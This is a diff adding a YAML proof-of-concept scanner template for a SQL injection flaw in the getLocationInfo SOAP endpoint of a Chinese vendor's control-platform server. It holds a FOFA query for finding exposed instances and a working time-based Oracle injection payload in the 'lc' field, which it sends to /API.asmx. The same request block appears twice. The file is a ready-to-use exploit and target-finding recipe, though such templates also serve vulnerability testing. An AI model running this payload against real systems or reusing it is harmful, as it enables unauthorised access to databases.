@@ -1,0 +1,39 @@
+id: poc-yaml-sendinfo-control-platform-server-getlocationinfo-sqli
+info:
+  name: 深大智能科技有限公司管控平台服务端 getLocationInfo SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 深大智能科技有限公司管控平台服务端
+  fofa: body="ItemsControlServer.aspx"
+requests:
+- method: POST
+  path: /API.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: '"http://tempuri.org/getLocationInfo"'
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <getLocationInfo xmlns=\"http://tempuri.org/\">\n      <lc>'\
+    \ OR 4155=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS\
+    \ T4,ALL_USERS T5)-- AodC</lc>\n      <isa>string</isa>\n    </getLocationInfo>\n\
+    \  </soap:Body>\n</soap:Envelope>"
+  expression: status_code == 200 && contains(body,"\"retdata\":") && contains(body,"getLocationInfoResponse")
+    && contains(body,"getLocationInfoResult") && contains(content_type,"text/xml")
+    && duration > 5 && duration < 7
+- method: POST
+  path: /API.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: '"http://tempuri.org/getLocationInfo"'
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <getLocationInfo xmlns=\"http://tempuri.org/\">\n      <lc>'\
+    \ OR 4155=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS\
+    \ T4,ALL_USERS T5)-- AodC</lc>\n      <isa>string</isa>\n    </getLocationInfo>\n\
+    \  </soap:Body>\n</soap:Envelope>"
+  expression: status_code == 200 && contains(body,"\"retdata\":") && contains(body,"getLocationInfoResponse")
+    && contains(body,"getLocationInfoResult") && contains(content_type,"text/xml")
+    && duration > 5 && duration < 7
+variables: {}
+transport: http
